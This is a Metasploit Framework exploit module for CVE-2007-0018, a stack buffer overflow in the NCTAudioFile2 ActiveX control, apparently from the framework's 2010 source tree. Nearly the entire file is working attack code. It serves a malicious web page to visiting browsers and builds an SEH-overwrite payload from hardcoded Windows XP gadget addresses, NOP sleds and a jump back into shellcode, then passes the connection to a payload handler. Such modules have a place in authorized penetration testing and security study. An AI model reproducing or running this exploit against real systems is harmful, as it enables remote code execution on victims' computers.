##
# $Id: nctaudiofile2_setformatlikesample.rb 9668 2010-07-03 01:38:15Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NCTAudioFile2 v2.x ActiveX Control SetFormatLikeSample() Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the NCTAudioFile2.Audio ActiveX
				Control provided by various audio applications. By sending a overly long
				string to the "SetFormatLikeSample()" method, an attacker may be able to
				execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC', 'dookie', 'jduck' ],
			'Version'        => '$Revision: 9668 $',
			'References'     =>
				[
					[ 'CVE', '2007-0018' ],
					[ 'OSVDB', '32032' ],
					[ 'BID', '22196' ],
					[ 'US-CERT-VU', '292713' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-May/062911.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 2048,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# tested with:
					#
					# BearShare 6.0.2.26789 (NCTAudioFile2.dll v2.5.7.514)
					# BearShare 6.0.0.22717 (NCTAudioFile2.dll v2.5.7.514)
					# Magic Audio Editor Pro v10.3.11 (NCTAudioFile2.dll v2.6.1.643)
					# Magic Audio Editor Pro v10.3.15.1 (NCTAudioFile2.dll v2.6.1.643)
					#
					[ 'Windows XP SP2/SP3 Pro English (IE6)',
						{
							'PopPopRet' => 0x746C15A9, # p/p/r in msls31.dll (ie6)
							'jmp esp' => 0x774699bf, # user32.dll (xp sp2 and sp3)
						}
					],
				],
			'DisclosureDate' => 'Jan 24 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# dual targeting super fun..
		sploit = p.encoded
		sploit << rand_text_alpha(4100 - p.encoded.length)

		# if seh is triggered, we'll use a pop/pop/ret
		seh = generate_seh_record(target['PopPopRet'])
		sploit << seh

		# padding
		sploit << make_nops(16 - seh.length)

		# otherwise, we need to jump to the stack
		sploit << [target['jmp esp']].pack('V')
		sploit << make_nops(32)

		# jump back to the payload :)
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-0x1000").encode_string

		# try to ensure SEH is triggered..
		sploit << rand_text_alpha(1000) * 18

		# Build out the message
		content = %Q|
<html>
<body>
<object classid='clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC' id='#{vname}'></object>
<script language='javascript'>
var #{vname} = document.getElementById('#{vname}');
var #{strname} = new String('#{sploit}');
#{vname}.SetFormatLikeSample(#{strname});
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end